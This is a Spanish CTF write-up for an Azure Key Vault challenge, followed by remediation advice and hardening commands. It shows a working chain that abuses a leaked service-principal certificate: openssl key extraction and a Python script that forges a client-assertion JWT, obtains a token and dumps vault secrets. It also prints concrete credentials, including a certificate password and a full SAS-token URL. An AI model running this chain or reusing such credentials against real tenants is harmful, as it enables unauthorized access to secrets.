# CTF Writeup: MediCloudX Labs Research II

## Información del Reto

- **Nombre**: MediCloudX Labs Research II
- **Puntos**: 496
- **Categoría**: Cloud Security / Azure / Key Vault / Service Principal
- **URL**: https://kv-ctf25-ch03-8q9s65qb.vault.azure.net/
- **Hint**: "Los certificados abren puertas a secretos del vault de la vida..."

## Descripción

Este reto requiere acceder a un Azure Key Vault protegido utilizando credenciales encontradas en el reto anterior (Research I).

## Flag

```
CTF{k3y_v4ult_pr1v1l3g3_3sc4l4t10n_fr0m_s3rv1c3_pr1nc1p4l}
```

## Dependencias

Este reto depende del **Research I** donde se obtuvieron:
- Un certificado PFX codificado en base64 (`certificadob64delpfx.txt`)
- Un script PowerShell con credenciales (`script.ps1`)

## Solución

### 1. Reconocimiento Inicial

URL del Key Vault proporcionada:
```
https://kv-ctf25-ch03-8q9s65qb.vault.azure.net/
```

Información extraída:
- **Key Vault Name**: `kv-ctf25-ch03-8q9s65qb`
- **Servicio**: Azure Key Vault
- **Requiere**: Autenticación con Azure AD Bearer token

### 2. Intento de Acceso Sin Autenticación

```bash
curl -s "https://kv-ctf25-ch03-8q9s65qb.vault.azure.net/secrets?api-version=7.4"
```

**Resultado**:
```json
{
  "error": {
    "code": "Unauthorized",
    "message": "AKV10000: Request is missing a Bearer or PoP token."
  }
}
```

Se requiere autenticación con Azure AD.

### 3. Análisis del Reto Anterior (Research I)

Del reto anterior obtuvimos dos archivos críticos del contenedor `medicloud-research`:

#### 3.1. certificadob64delpfx.txt

Contenido: Certificado PFX codificado en base64 (3,492 bytes)

#### 3.2. script.ps1

Script PowerShell que reveló información crítica:

```powershell
# Azure Configuration
$TenantId = "c390256a-8963-4732-b874-85b7b0a4d514"
$ClientId = "39934cfb-ca90-4bec-9c2f-5938439cfcaa"
$CertificatePassword = "M3d1Cl0ud25!"
```

**Información Obtenida**:
- **Tenant ID**: `c390256a-8963-4732-b874-85b7b0a4d514`
- **Application/Client ID**: `39934cfb-ca90-4bec-9c2f-5938439cfcaa`
- **Certificate Password**: `M3d1Cl0ud25!`

### 4. Descarga y Decodificación del Certificado

#### Paso 1: Descargar el certificado

```bash
curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/certificadob64delpfx.txt?sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D" -o certificadob64delpfx.txt
```

#### Paso 2: Decodificar de Base64 a PFX

```bash
base64 -d certificadob64delpfx.txt > certificate.pfx
```

#### Paso 3: Verificar el archivo

```bash
file certificate.pfx
# Output: certificate.pfx: data
```

#### Paso 4: Extraer certificado y clave privada

```bash
# Extraer el certificado
openssl pkcs12 -in certificate.pfx -clcerts -nokeys \
  -passin pass:"M3d1Cl0ud25!" -out cert.pem

# Extraer la clave privada
openssl pkcs12 -in certificate.pfx -nocerts -nodes \
  -passin pass:"M3d1Cl0ud25!" -out key.pem
```

### 5. Autenticación en Azure AD con Certificate-Based Authentication

Para acceder a Azure Key Vault, necesitamos:

1. Crear un **Client Assertion** (JWT firmado con el certificado)
2. Intercambiarlo por un **Access Token** en Azure AD
3. Usar el token para acceder a Key Vault

#### Flujo de Autenticación

```
Certificate + Private Key
        ↓
    Create JWT (Client Assertion)
        ↓
    POST to Azure AD Token Endpoint
        ↓
    Receive Access Token
        ↓
    Use Token to Access Key Vault
```

### 6. Script de Explotación

Creé un script Python para automatizar el proceso:

```python
#!/usr/bin/env python3
import requests
import jwt
import time
import uuid
from cryptography.hazmat.primitives import serialization
from cryptography import x509
import base64
import hashlib

# Configuration
TENANT_ID = "c390256a-8963-4732-b874-85b7b0a4d514"
CLIENT_ID = "39934cfb-ca90-4bec-9c2f-5938439cfcaa"
KEY_VAULT_URL = "https://kv-ctf25-ch03-8q9s65qb.vault.azure.net"

def create_client_assertion(cert, private_key):
    """Create JWT signed with certificate"""

    # Calculate certificate thumbprint (x5t)
    cert_der = cert.public_bytes(serialization.Encoding.DER)
    thumbprint = hashlib.sha1(cert_der).digest()
    thumbprint_b64 = base64.urlsafe_b64encode(thumbprint).decode('utf-8').rstrip('=')

    headers = {
        "alg": "RS256",
        "typ": "JWT",
        "x5t": thumbprint_b64
    }

    now = int(time.time())
    payload = {
        "aud": f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token",
        "exp": now + 600,
        "iss": CLIENT_ID,
        "jti": str(uuid.uuid4()),
        "nbf": now,
        "sub": CLIENT_ID,
        "iat": now
    }

    return jwt.encode(payload, private_key, algorithm="RS256", headers=headers)

def get_access_token(client_assertion):
    """Exchange client assertion for access token"""

    token_url = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"

    data = {
        "client_id": CLIENT_ID,
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": client_assertion,
        "scope": "https://vault.azure.net/.default",
        "grant_type": "client_credentials"
    }

    response = requests.post(token_url, data=data)
    return response.json()['access_token']

def list_secrets(access_token):
    """List all secrets in Key Vault"""

    url = f"{KEY_VAULT_URL}/secrets?api-version=7.4"
    headers = {"Authorization": f"Bearer {access_token}"}

    response = requests.get(url, headers=headers)
    return response.json()['value']

def get_secret(access_token, secret_name):
    """Get secret value"""

    url = f"{KEY_VAULT_URL}/secrets/{secret_name}?api-version=7.4"
    headers = {"Authorization": f"Bearer {access_token}"}

    response = requests.get(url, headers=headers)
    return response.json()['value']
```

### 7. Ejecución y Obtención de la Flag

```bash
python3 get_keyvault_secrets.py
```

**Output**:
```
============================================================
Azure Key Vault Secret Retrieval
============================================================
[+] Loading certificate and private key...
[+] Creating client assertion JWT...
[+] Requesting access token from Azure AD...
[+] Access token obtained successfully!
[+] Listing secrets in Key Vault: kv-ctf25-ch03-8q9s65qb
[+] Found 1 secret(s):
    - flag

============================================================
Retrieving secret values:
============================================================

[+] Retrieving secret: flag
[+] Secret value: CTF{k3y_v4ult_pr1v1l3g3_3sc4l4t10n_fr0m_s3rv1c3_pr1nc1p4l}

============================================================
Done!
============================================================
```

## Vulnerabilidad Técnica

### Descripción

**Azure Service Principal Certificate Exposure con Key Vault Access**

La cadena de vulnerabilidades consiste en:

### 1. Exposición de Certificado de Service Principal

**Del Reto Research I**:
- Certificado PFX almacenado en un contenedor con SAS token expuesto
- Certificado protegido con contraseña débil hardcodeada
- Password expuesta en script PowerShell en el mismo contenedor

### 2. Información Sensible en Scripts

**script.ps1** contenía:
- Tenant ID de Azure AD
- Application/Client ID
- Password del certificado
- Información sobre el proyecto y permisos

### 3. Service Principal con Permisos Excesivos

El Service Principal autenticado con el certificado tiene:
- Acceso completo al Key Vault
- Permiso para listar secretos (`Get` y `List`)
- Sin restricciones de IP o red
- Sin MFA o conditional access

### Cadena de Ataque Completa

```
Reto Research I: SAS Token Expuesto
        ↓
Listar contenedor medicloud-research
        ↓
Descargar certificadob64delpfx.txt
        ↓
Descargar script.ps1
        ↓
Extraer: Tenant ID, Client ID, Certificate Password
        ↓
Decodificar certificado PFX
        ↓
Extraer certificado y clave privada
        ↓
Crear Client Assertion JWT
        ↓
Autenticar en Azure AD
        ↓
Obtener Access Token
        ↓
Acceder a Key Vault
        ↓
Listar y obtener secretos
        ↓
FLAG: CTF{k3y_v4ult_pr1v1l3g3_3sc4l4t10n_fr0m_s3rv1c3_pr1nc1p4l}
```

## Vulnerabilidades Identificadas

### 1. Credential Exposure

**Severidad**: Crítica

- **Certificado de Service Principal expuesto** en storage público
- **Password hardcodeada** en script
- **Tenant ID y Client ID** revelados
- Sin rotación de credenciales

### 2. Excessive Permissions

**Severidad**: Alta

- Service Principal con acceso completo a Key Vault
- Permisos de `Get` y `List` sobre secretos
- Sin principio de mínimo privilegio
- Sin segregación de roles

### 3. Lack of Network Restrictions

**Severidad**: Media

- Key Vault accesible desde Internet
- Sin Private Endpoints
- Sin IP whitelisting
- Sin Service Endpoints

### 4. No MFA/Conditional Access

**Severidad**: Media

- Autenticación solo con certificado
- Sin MFA para Service Principals
- Sin Conditional Access Policies
- Sin restricciones geográficas

## Impacto

### Impacto en el Mundo Real

Si esta vulnerabilidad existiera en un entorno de producción:

1. **Exposición de Secretos**:
   - Acceso a todas las credenciales en Key Vault
   - Claves de API, connection strings, passwords
   - Certificados y claves de cifrado

2. **Escalación de Privilegios**:
   - Usar secretos para acceder a otros recursos
   - Comprometer bases de datos, storage accounts
   - Acceso a sistemas internos

3. **Movimiento Lateral**:
   - Usar credenciales para acceder a otros servicios Azure
   - Comprometer toda la infraestructura cloud
   - Acceso a datos de producción

4. **Compliance Issues**:
   - Violación de HIPAA (datos médicos)
   - Incumplimiento de GDPR
   - Problemas legales y regulatorios

## Mejores Prácticas de Seguridad

### 1. Protección de Service Principal Certificates

#### ❌ MAL - Como en el reto:
```powershell
# Certificado en storage público
# Password hardcodeada en script
$CertificatePassword = "M3d1Cl0ud25!"
```

#### ✅ BIEN - Configuración segura:

**A. Usar Managed Identities en lugar de Service Principals**:
```bash
# Asignar Managed Identity a la VM/App Service
az vm identity assign --name myVM --resource-group myRG

# Dar acceso al Key Vault
az keyvault set-policy \
  --name myKeyVault \
  --object-id <managed-identity-object-id> \
  --secret-permissions get list
```

**B. Si se requiere Service Principal, usar Azure Key Vault**:
```bash
# Crear certificado directamente en Key Vault
az keyvault certificate create \
  --vault-name myKeyVault \
  --name spn-cert \
  --policy @policy.json

# El certificado nunca sale de Key Vault
# Se usa internamente para autenticación
```

**C. Rotación automática de certificados**:
```bash
# Configurar auto-rotación
az keyvault certificate set-attributes \
  --vault-name myKeyVault \
  --name spn-cert \
  --enabled true \
  --expires $(date -d "+90 days" +%Y-%m-%dT%H:%M:%SZ)
```

### 2. Key Vault Access Policies con Mínimo Privilegio

#### ❌ MAL - Permisos excesivos:
```bash
# Acceso completo a todo
az keyvault set-policy \
  --name myKeyVault \
  --spn <app-id> \
  --secret-permissions all \
  --key-permissions all \
  --certificate-permissions all
```

#### ✅ BIEN - Permisos granulares:
```bash
# Solo los permisos necesarios para secretos específicos
az keyvault set-policy \
  --name myKeyVault \
  --spn <app-id> \
  --secret-permissions get \
  --resource-group myRG

# Usar RBAC en lugar de Access Policies (recomendado)
az role assignment create \
  --role "Key Vault Secrets User" \
  --assignee <app-id> \
  --scope /subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.KeyVault/vaults/{kv}
```

### 3. Network Security para Key Vault

```bash
# Deshabilitar acceso público
az keyvault update \
  --name myKeyVault \
  --resource-group myRG \
  --public-network-access Disabled

# Crear Private Endpoint
az network private-endpoint create \
  --name kv-private-endpoint \
  --resource-group myRG \
  --vnet-name myVNet \
  --subnet mySubnet \
  --private-connection-resource-id $(az keyvault show --name myKeyVault --query id -o tsv) \
  --group-id vault \
  --connection-name kv-connection

# Configurar firewall rules (si se requiere acceso público)
az keyvault network-rule add \
  --name myKeyVault \
  --ip-address <your-ip>/32

# Habilitar service endpoints
az keyvault update \
  --name myKeyVault \
  --default-action Deny
```

### 4. Monitoring y Alertas

```bash
# Habilitar diagnostic settings
az monitor diagnostic-settings create \
  --name kv-diagnostics \
  --resource $(az keyvault show --name myKeyVault --query id -o tsv) \
  --logs '[{"category": "AuditEvent", "enabled": true}]' \
  --workspace <log-analytics-workspace-id>

# Crear alerta para acceso inusual
az monitor metrics alert create \
  --name "KeyVault-Unusual-Access" \
  --resource-group myRG \
  --scopes $(az keyvault show --name myKeyVault --query id -o tsv) \
  --condition "count ServiceApiHit > 100" \
  --description "Alert on unusual Key Vault access patterns"
```

### 5. Conditional Access Policies

```bash
# Implementar Conditional Access para Service Principals (requiere Azure AD Premium)
# - Restricciones geográficas
# - Restricciones de IP
# - Require compliant devices
# - Risk-based access
```

### 6. Secrets Management Best Practices

**A. Usar versiones de secretos**:
```bash
# Azure automáticamente versiona secretos
az keyvault secret set \
  --vault-name myKeyVault \
  --name mySecret \
  --value "new-value"

# Acceder a versión específica
az keyvault secret show \
  --vault-name myKeyVault \
  --name mySecret \
  --version <version-id>
```

**B. Configurar expiración de secretos**:
```bash
az keyvault secret set \
  --vault-name myKeyVault \
  --name mySecret \
  --value "secret-value" \
  --expires $(date -d "+90 days" +%Y-%m-%dT%H:%M:%SZ)
```

**C. Usar tags para clasificación**:
```bash
az keyvault secret set \
  --vault-name myKeyVault \
  --name mySecret \
  --value "secret-value" \
  --tags environment=production sensitivity=high owner=security-team
```

### 7. Certificate-Based Authentication Best Practices

**A. Usar certificados autofirmados solo para desarrollo**:
```bash
# Desarrollo/Testing
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365

# Producción: Usar CA autorizada
az keyvault certificate create \
  --vault-name myKeyVault \
  --name prod-cert \
  --policy @policy-with-ca.json
```

**B. Implementar Certificate Pinning**:
```python
# Validar thumbprint del certificado en código
expected_thumbprint = "ABC123..."
if cert_thumbprint != expected_thumbprint:
    raise Exception("Certificate thumbprint mismatch")
```

**C. Monitorear expiración de certificados**:
```bash
# Azure Monitor alerta para certificados próximos a expirar
az monitor metrics alert create \
  --name "Certificate-Expiring-Soon" \
  --resource-group myRG \
  --scopes $(az keyvault show --name myKeyVault --query id -o tsv) \
  --condition "DaysToExpiry < 30" \
  --description "Alert when certificates are expiring soon"
```

## Herramientas Utilizadas

- `curl` - HTTP client
- `openssl` - Extracción de certificados y claves
- `base64` - Decodificación
- Python 3 con:
  - `requests` - HTTP requests
  - `PyJWT` - JWT creation
  - `cryptography` - Certificate handling

## Comandos de Explotación Resumidos

```bash
# 1. Descargar certificado del reto anterior
SAS="sv=2018-11-09&sr=c&st=2025-11-17T20:20:21Z&se=2026-11-17T20:20:21Z&sp=rl&spr=https&sig=l3MOATfhFRKy2vu7GVEYMTVtEz3iBulsjjuyv4QjGIw%3D"
curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/certificadob64delpfx.txt?${SAS}" -o cert.txt
curl -s "https://ctf25sac672da51.blob.core.windows.net/medicloud-research/script.ps1?${SAS}" -o script.ps1

# 2. Decodificar certificado
base64 -d cert.txt > certificate.pfx

# 3. Extraer certificado y clave (password: M3d1Cl0ud25!)
openssl pkcs12 -in certificate.pfx -clcerts -nokeys -passin pass:"M3d1Cl0ud25!" -out cert.pem
openssl pkcs12 -in certificate.pfx -nocerts -nodes -passin pass:"M3d1Cl0ud25!" -out key.pem

# 4. Ejecutar script Python para obtener secretos
python3 get_keyvault_secrets.py
```

## Lecciones Aprendidas

### 1. Defense in Depth

Un solo control de seguridad no es suficiente:
- Storage Account mal configurado (Research I)
- + Script con credenciales hardcodeadas
- + Certificado con password débil
- + Service Principal con permisos excesivos
- + Key Vault accesible desde Internet
- = **Compromiso total**

### 2. Credential Management

**Nunca almacenar credenciales en**:
- Scripts en repositorios
- Storage accounts públicos o semi-públicos
- Variables de entorno sin cifrar
- Archivos de configuración en código fuente

**Usar en su lugar**:
- Azure Key Vault para secretos
- Managed Identities para autenticación
- Azure AD Workload Identity
- Secrets rotation automática

### 3. Principio de Mínimo Privilegio

El Service Principal tenía acceso completo a Key Vault:
- Solo necesitaba acceso a secretos específicos
- Debería usar RBAC en lugar de Access Policies
- Implementar Just-In-Time (JIT) access
- Revisar y auditar permisos regularmente

### 4. Network Segmentation

Key Vault accesible desde Internet:
- Usar Private Endpoints para recursos internos
- Implementar firewall rules
- Usar Service Endpoints
- Segmentar redes por sensibilidad de datos

### 5. Monitoring es Esencial

Sin monitoring, este ataque pasaría desapercibido:
- Habilitar Azure Monitor
- Configurar alertas para accesos inusuales
- Usar Microsoft Sentinel para SIEM
- Revisar logs regularmente

## Arquitectura Segura Recomendada

```
┌─────────────────────────────────────────────────────────┐
│                    Internet                              │
└────────────────────┬────────────────────────────────────┘
                     │
                     │ (Deny all public access)
                     ▼
            ┌────────────────────┐
            │  Azure Front Door  │
            │  + WAF             │
            └────────┬───────────┘
                     │
                     │ (Conditional Access)
                     ▼
            ┌────────────────────┐
            │   Azure VNet       │
            │                    │
            │  ┌──────────────┐  │
            │  │  App Service │  │
            │  │  (Managed    │  │
            │  │   Identity)  │  │
            │  └──────┬───────┘  │
            │         │          │
            │         │ Private  │
            │         │ Endpoint │
            │         ▼          │
            │  ┌──────────────┐  │
            │  │  Key Vault   │  │
            │  │  (Private)   │  │
            │  │              │  │
            │  │  + RBAC      │  │
            │  │  + Firewall  │  │
            │  │  + Monitoring│  │
            │  └──────────────┘  │
            └────────────────────┘
                     │
                     ▼
            ┌────────────────────┐
            │  Log Analytics     │
            │  + Azure Monitor   │
            │  + Microsoft       │
            │    Sentinel        │
            └────────────────────┘
```

## Comparación: Service Principal vs Managed Identity

| Característica | Service Principal | Managed Identity |
|----------------|-------------------|------------------|
| **Credential Management** | Manual (certificados/secrets) | Automático (Azure gestiona) |
| **Rotation** | Manual | Automática |
| **Storage** | Debe guardarse seguramente | No almacenamiento necesario |
| **Exposure Risk** | Alto (puede filtrarse) | Bajo (invisible al usuario) |
| **Cost** | Gestión operativa alta | Mínima gestión |
| **Use Case** | Apps externas a Azure | Apps dentro de Azure |
| **Recommendation** | Solo si es necesario | **Preferido siempre que sea posible** |

## Referencias

- [Azure Key Vault Security](https://docs.microsoft.com/en-us/azure/key-vault/general/security-features)
- [Azure AD Certificate-Based Authentication](https://docs.microsoft.com/en-us/azure/active-directory/authentication/active-directory-certificate-based-authentication-get-started)
- [Service Principal Best Practices](https://docs.microsoft.com/en-us/azure/active-directory/develop/howto-create-service-principal-portal)
- [Managed Identities for Azure Resources](https://docs.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview)
- [Azure Key Vault Best Practices](https://docs.microsoft.com/en-us/azure/key-vault/general/best-practices)
- [OWASP Cloud Security - Secret Management](https://owasp.org/www-project-cloud-security/)

---

**Fecha de resolución**: 21 de noviembre de 2025
**Autor**: CTF Team
**Dificultad**: Media-Alta (requiere comprensión de Azure AD, certificados, JWT, y Key Vault)
**Retos relacionados**: MediCloudX Labs Research I (dependencia)
